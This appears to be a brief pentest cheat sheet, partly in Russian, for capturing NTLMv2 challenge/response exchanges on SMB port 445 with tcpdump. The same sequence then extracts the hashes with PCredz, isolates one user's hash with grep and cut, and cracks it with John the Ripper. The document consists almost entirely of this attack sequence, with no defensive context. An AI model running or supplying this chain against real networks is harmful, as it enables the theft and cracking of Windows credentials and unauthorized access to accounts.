# To sniff a NTLMv2 challenge/response exchange via SMB

`sudo tcpdump -nv -s0 port 445 -w /tmp/winauth.pcap`

`-s0` - indicates that we want full packets, not just the first 68 bytes (some old versions of tcpdump will only grab the first 68 bytes).
`-v` - makes tcpdump print out how many packets it has received so far
`-w` - option causes tcpdump to put its packets in a packet capture file for us

## PCredz
 
Извлекаем хеши из трафика:

`./Pcredz -v -f /tmp/winauth.pcap`

`-f FNAME` pcap file to parse
`-v` - more verbose.

Вырезаем хеш в отдельный файл

`grep clark CredentialDump-Session.log | cut -d ' ' -f 5 | tee hash.txt`

Подбираем хеш:

`john hash.txt`
